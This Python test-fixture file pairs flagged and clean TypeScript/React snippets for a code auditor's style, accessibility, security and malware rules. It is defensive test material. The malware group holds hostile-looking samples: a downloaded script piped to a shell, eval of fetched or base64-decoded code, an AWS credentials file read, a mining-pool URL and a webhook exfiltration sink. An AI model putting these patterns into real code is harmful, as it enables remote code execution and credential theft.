"""Per-detector (rule_id, bad, good) snippets for the TS/React detectors — the TS analog of
``tests/_detector_cases.py``. ``bad`` must flag the rule; ``good`` must not.

Every rule here is objective + framework-agnostic (a11y / structure) — the auditor encodes no
design-system vocabulary, so there are no "raw markup -> specific primitive" cases."""

GROUPS: dict[str, list[tuple[str, str, str]]] = {
    "style": [
        (
            "TS-STYLE-DUPLICATE-IMPORT",
            'import { a } from "x";\nimport { b } from "x";\n',
            'import { a, b } from "x";\n',
        ),
    ],
    "react": [
        (
            "TS-REACT-MULTI-COMPONENT-FILE",
            "export function A() {\n  return <div />;\n}\nexport function B() {\n  return <span />;\n}\n",
            "export function A() {\n  return <div />;\n}\nfunction helper() {\n  return 1;\n}\n",
        ),
        (
            "TS-REACT-ARRAY-INDEX-KEY",
            "const x = <ul>{items.map((it, i) => <li key={i}>{it}</li>)}</ul>;\n",
            "const x = <ul>{items.map((it) => <li key={it.id}>{it.name}</li>)}</ul>;\n",
        ),
        (
            "TS-REACT-REPEATED-JSX",
            "const x = (\n  <ul>\n    <li><a>1</a></li>\n    <li><a>2</a></li>\n    <li><a>3</a></li>\n  </ul>\n);\n",
            "const x = (\n  <ul>\n    <li><a>1</a></li>\n  </ul>\n);\n",
        ),
        (
            "TS-REACT-EXTRACTABLE-HOOK",
            "export function W() {\n  const [a, setA] = useState(0);\n  const [b, setB] = useState(0);\n  const [c, setC] = useState(0);\n  useEffect(() => setA(1), []);\n  useEffect(() => setB(2), []);\n  return <div>{a}{b}{c}</div>;\n}\n",
            "export function W() {\n  const [a, setA] = useState(0);\n  return <div>{a}</div>;\n}\n",
        ),
        (
            "TS-REACT-EXTRACTABLE-HELPER",
            "export function W({ n }: { n: number }) {\n  const [x] = useState(0);\n  function score(raw: number) {\n    const v = raw * 2;\n    return Math.round(v);\n  }\n  return <div>{score(n)}{x}</div>;\n}\n",
            "export function W() {\n  const [x, setX] = useState(0);\n  function bump() {\n    setX(x + 1);\n  }\n  return <button onClick={bump}>{x}</button>;\n}\n",
        ),
        (
            "TS-REACT-PARALLEL-SIBLING",
            "function toKib(n: number) {\n  const v = n / 1024;\n  return v.toFixed(1);\n}\nfunction toMib(n: number) {\n  const v = n / 1048576;\n  return v.toFixed(1);\n}\n",
            "function a(n: number) {\n  return n + 1;\n}\nfunction b(n: number) {\n  return n.toString();\n}\n",
        ),
    ],
    "a11y": [
        (
            "TS-A11Y-NONINTERACTIVE-ONCLICK",
            "const x = <div onClick={go}>label</div>;\n",
            'const x = (\n  <div role="button" tabIndex={0} onClick={go} onKeyDown={k}>\n    label\n  </div>\n);\n',
        ),
        (
            "TS-A11Y-ICON-BUTTON-NO-LABEL",
            "const x = (\n  <Button>\n    <CloseIcon />\n  </Button>\n);\n",
            'const x = (\n  <Button aria-label="close">\n    <CloseIcon />\n  </Button>\n);\n',
        ),
        (
            "TS-A11Y-IMG-NO-ALT",
            'const x = <img src="logo.png" />;\n',
            'const x = <img src="logo.png" alt="logo" />;\n',
        ),
        (
            "TS-A11Y-POSITIVE-TABINDEX",
            "const x = <div tabIndex={3}>x</div>;\n",
            "const x = <div tabIndex={0}>x</div>;\n",
        ),
        (
            "TS-A11Y-FORM-LABEL",
            'const x = <input type="text" />;\n',
            'const x = <input type="text" aria-label="name" />;\n',
        ),
        (
            "TS-A11Y-ANCHOR-NO-HREF",
            "const x = <a onClick={go}>x</a>;\n",
            'const x = <a href="/x">x</a>;\n',
        ),
        (
            "TS-A11Y-AUTOFOCUS",
            "const x = <div autoFocus tabIndex={0}>x</div>;\n",
            "const x = <div tabIndex={0}>x</div>;\n",
        ),
        (
            "TS-A11Y-REDUNDANT-ROLE",
            'const x = <button role="button">go</button>;\n',
            "const x = <button>go</button>;\n",
        ),
        (
            "TS-A11Y-MOUSE-NO-KEY",
            "const x = <div onMouseOver={f}>x</div>;\n",
            "const x = <div onMouseOver={f} onFocus={g}>x</div>;\n",
        ),
        (
            "TS-A11Y-IFRAME-TITLE",
            'const x = <iframe src="/x" />;\n',
            'const x = <iframe src="/x" title="map" />;\n',
        ),
        (
            "TS-A11Y-DECORATIVE-ICON",
            "const x = <button><PlusIcon /> Save</button>;\n",
            'const x = <button><PlusIcon aria-hidden="true" /> Save</button>;\n',
        ),
    ],
    "security": [
        (
            "TS-SEC-DANGEROUS-HTML",
            "const x = <div dangerouslySetInnerHTML={{ __html: userHtml }} />;\n",
            'const x = <div dangerouslySetInnerHTML={{ __html: "<b>safe</b>" }} />;\n',
        ),
        (
            "TS-SEC-TARGET-BLANK-NOOPENER",
            'const x = <a href="/x" target="_blank">go</a>;\n',
            'const x = <a href="/x" target="_blank" rel="noopener">go</a>;\n',
        ),
        (
            "TS-SEC-JAVASCRIPT-URL",
            'const x = <a href="javascript:alert(1)">go</a>;\n',
            'const x = <a href="/safe">go</a>;\n',
        ),
        (
            "TS-SEC-DANGEROUS-EVAL",
            "const x = eval(code);\n",
            "const x = JSON.parse(code);\n",
        ),
    ],
    "complexity": [
        (
            "TS-STYLE-FILE-SIZE",
            "const x = 1;\n" * 801,
            "const x = 1;\n",
        ),
        (
            "TS-REACT-TOO-MANY-PROPS",
            "export function W({ a, b, c, d, e, f, g }: Props) {\n  return <div />;\n}\n",
            "export function W({ a }: Props) {\n  return <div />;\n}\n",
        ),
        (
            "TS-REACT-DEEP-JSX-NESTING",
            "const x = (\n  <div><div><div><div><div><div><div>deep</div></div></div></div></div></div></div>\n);\n",
            "const x = (\n  <div><div>shallow</div></div>\n);\n",
        ),
    ],
    "malware": [
        (
            "TS-MAL-OBFUSCATED-EXEC",
            "eval(atob(payload));\n",
            "const decoded = atob(payload);\n",  # decode, no eval
        ),
        (
            "TS-MAL-REMOTE-EXEC",
            "async function f(u) {\n  eval(await fetch(u).then((r) => r.text()));\n}\n",
            "async function f(u) {\n  const body = await fetch(u).then((r) => r.text());\n}\n",
        ),
        (
            "TS-MAL-DOWNLOAD-EXEC",
            'execSync("curl http://example.invalid/x.sh | sh");\n',
            'execSync("curl -o out http://example.invalid/x.sh");\n',  # download, not piped to a shell
        ),
        (
            "TS-MAL-DYNAMIC-REQUIRE",
            "const mod = require(name);\n",
            'const mod = require("fs");\n',  # static literal path
        ),
        (
            "TS-MAL-CRYPTO-MINER",
            'const pool = "stratum+tcp://pool.example.invalid:4444";\n',
            'const url = "https://api.example.com/v1";\n',
        ),
        (
            "TS-MAL-CREDENTIAL-ACCESS",
            'const p = readFileSync("/home/u/.aws/credentials");\n',
            'const p = readFileSync("/home/u/project/config.yaml");\n',
        ),
        (
            "TS-MAL-ENCODED-BLOB",
            f'const blob = "{"A" * 240}";\n',
            'const token = "short-normal-string";\n',
        ),
        (
            "TS-MAL-EXEC-INJECTION",
            "execSync(`tar -czf /tmp/a.tgz ${dir}`);\n",  # command built from interpolation
            'execSync("tar -czf /tmp/a.tgz ./src");\n',  # a fixed, literal command
        ),
        (
            "TS-MAL-EXFIL-URL",
            'const sink = "https://webhook.site/00000000-0000-0000-0000-000000000000";\n',
            'const url = "https://api.example.com/v1/events";\n',  # a normal service URL
        ),
    ],
}
